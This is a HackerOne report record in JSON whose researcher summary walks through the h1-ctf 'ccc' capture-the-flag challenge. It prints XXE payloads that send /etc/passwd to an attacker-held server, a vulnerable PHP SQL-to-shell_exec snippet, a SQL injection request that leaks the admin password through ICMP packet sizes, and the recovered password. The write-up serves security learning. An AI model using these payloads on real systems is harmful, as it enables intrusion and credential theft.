{
  "id": 1216085,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjE2MDg1",
  "url": "https://hackerone.com/reports/1216085",
  "title": "ccc ctf ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-06-03T07:47:03.844Z",
  "submitted_at": "2021-06-03T07:47:03.889Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "shamollash",
    "url": "/shamollash",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-06-23T16:18:55.665Z",
  "bug_reporter_agreed_on_going_public_at": "2021-06-22T18:19:51.293Z",
  "team_member_agreed_on_going_public_at": "2021-06-23T16:18:55.569Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "██████████\n\nwill send  detailed report later\n\n## Impact\n\ncan get admin credentials",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-07-22T18:19:51.363Z",
  "allow_singular_disclosure_after": -80855573.24679501,
  "singular_disclosure_allowed": true,
  "vote_count": 12,
  "voters": [
    "osman1337",
    "ali",
    "h4x0r_dz",
    "0xwise",
    "cryptographer",
    "datsmed",
    "chard213",
    "rykkard",
    "nehagaganmakhija",
    "xmrhrx",
    "and 2 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 72510,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.ccc.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 57601,
      "category": "researcher",
      "content": "We are given this website \n\n\thttps://ccc.h1ctf.com/\n\nWe can register a user which is assigned a user hash. In our case we got `8y399q` as user hash. Once logged in the page `/u/8y399q` just says:\n\n\n\t: Remote File list not found\n\n\nThe website points to a twitter account `https://twitter.com/DesignsCcc`. There we find a picture with a browser opened on the website we are attacking. One tab of the browser seems to point to: `/error_-_-_log.txt`\n\nWe are able to confirm that this file exists and it contains\n\n\tFile: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\nOne of the buckets is intersting becaus it contains an hint towards XXE:\n\n```\nhttps://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml\n\n<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://patopirata.com/x\"> %ext;\n]>\n<r></r>\n```\n\nAfter a long struggle on many dead ends, and a couple of rickrollings we started wondering how can we make the site read a remote list of files. \n\nAt this point the key observation is that the log file above seems to suggest that the site will query a files.xml on AWS S3 with a predictable name:\n\n\th1-MYHASH.s3.eu-west-2.amazonaws.com/files.xml\n\n\nSo we went to AWS console and put an evil xml file in a public s3 bucket\n\n\n```\n    <?xml version=\"1.0\" ?>\n    <!DOCTYPE r [\n    <!ELEMENT r ANY >\n    <!ENTITY % sp SYSTEM \"http://MYSERVER:8080/ev.xml\">\n    %sp;\n    %param1;\n    ]>\n   <r>&exfil;</r>\n```\n\nWe were able to confirm the XXE vulnerability and after a lot of trial and error, working with the external DTD (in order not to change the xml on S3) we came up with this payload in the external dtd `ev.xml`:\n\n\n```xml\n<!ENTITY % data SYSTEM \"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % param \"<!ENTITY &#37; exfil SYSTEM 'ftp://MYSERVER:2121/%data;'>\">\n%param;\n%exfil;\n```\n\nFor exfiltration we are using the excellent tool `https://github.com/staaldraad/xxeserv`\n\n\nHaving php  (knowing the author of this challenge we suspected that), is very useful: we can work with filters to compress and encode data in order to easily exfiltrate even \"big\" files. \n\nIn particular we started looking at /etc/nginx/nginx.conf (mentioned by the twitter account of the developers) which contains usual include directives:\n\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\ninclude /etc/nginx/modules-enabled/*.conf;\n\n...\n\tinclude /etc/nginx/conf.d/*.conf;\n\tinclude /etc/nginx/sites-enabled/*;\n}\n```\n\nThe default virtual host config `/etc/nginx/sites-enabled/default` is all commented out, so it's not the running configuration, but it contains an important clue:\n\n```\n#server {\n#    server_name ccc.h1ctf.com;\n#    root /var/www/app/public;\n#    index index.php;\n#    location / {\n#            try_files $uri $uri/ /index.php?$query_string;\n#    }\n#     location /2b5d2b11513d2c9b {\n#       proxy_pass http://127.0.0.1:8888;\n#     }\n#\n```\n\nMoving on to `ccc.h1ctf.com/2b5d2b11513d2c9b` we do some recon in there and find a `.git/HEAD` file. We cannot find much else in the .git directory apart from the configuration .git/config\n\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/ccc-labs/pinger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nWe now have the source code of the pinger service where we understand that we have to look at\n\n\thttps://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=XXX\n\nKey point is in the Ping model source code:\n\n`https://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L10`\n\n\n```\nclass Ping\n{\n\n    public static function send( $id ){\n        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';\n        $d = Db::connect()->prepare($sql);\n        $d->execute();\n        //Confirm we've found a matching row in the database\n        if( $d->rowCount() == 1 ){\n            $host = $d->fetch();\n            $ip = $host[\"ip\"];\n            $packet_size = intval($host[\"packet_size\"]);\n            //make sure PING packet size between 1 and 65527\n            if( $packet_size > 0 && $packet_size < 65528 ) {\n                //check IP is a valid IPv4 Address\n                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {\n                    //SEND 4 PING PACKETS IN THE BACKGROUND\n                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');\n                }\n            }\n        }\n    }\n\n}\n```\n\n\nThe service is clarly vulnerable to SQL injection, but given the validation applied to `$packet_size` and `$ip` we are not able to do nothing but actually ping something. \n\n*But* we have some room in `$packet_size` to put ascii codes of relevant characters. So in the end a request like the one below will exifltrate Nth character of the admin password:\n\n```\nGET /2b5d2b11513d2c9b/api/ping?\nid=-1+union+all+select+1,'MYSERVER',ascii(substr(password,N,1))+from+user+where+username='admin'%23 HTTP/1.1\n```\n\nIn particular it will generate ICMP packets towards my server\n\n```\n10:17:39.290067 eth0  In  IP 18.216.97.43 > x.y.z.w: ICMP echo request, id 223, seq 1, length 93\n```\n\nHere length 93 minus 8 for overhead will give ASCII 85 which is `U`, first character of the admin password. Repeating the exercise many times, sleeping one minute between request or, in my case, using a server with many different ip address will give the admin password `Ud79^1HHJ$W*IObaKdQgI`.\n\nLogging in the admin dashboard of pinger we get the flag:\n\n````\n████\n```",
      "user": {
        "id": 1428885,
        "username": "shamollash",
        "name": "Enrico Cavalli",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2020-12-14T13:07:33.656Z",
        "url": "https://hackerone.com/shamollash",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
